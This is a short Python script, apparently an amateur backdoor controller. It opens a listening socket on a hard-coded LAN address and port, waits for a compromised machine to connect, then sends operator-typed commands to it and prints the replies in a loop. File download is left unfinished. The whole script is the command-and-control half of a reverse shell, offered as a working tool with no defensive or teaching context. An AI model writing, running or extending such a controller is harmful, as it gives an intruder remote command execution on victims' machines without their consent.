import socket
from base64 import b64encode, b64decode

class back:
    '''Create a Class..!'''

    def __init__(self, ip, ports):
        '''this is a function'''
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, ports))
        listener.listen(0)
        print("[+] Wating for incoming Connections")
        self.connected, addres = listener.accept()
        print("[+] Get a Connection" + str(addres))

    def command_send(self, comnd):
        '''send and reciv data function'''
        self.connected.send(comnd)

    def donwload_data(self, name, contnd):
        pass

    def reciv_data(self):
        '''reciv data for cliend'''
        return self.connected.recv(2048).decode()
    
    def read_file(self, read_file_path):
        '''this function use to read a file used to rb mood
        and return the encode valu use to base64 library'''
        with open(read_file_path, "rb") as f:
            return f.read()
       
        
    def run(self):
        '''all function run if while True'''
        while True:
            read_command = input(">>")
            # if read_command.startswith("downlod"):
            
           
            self.command_send(read_command.encode())
            
            result = self.reciv_data()
            print(result)






listenr = back("192.168.0.102", 8080)
listenr.run()
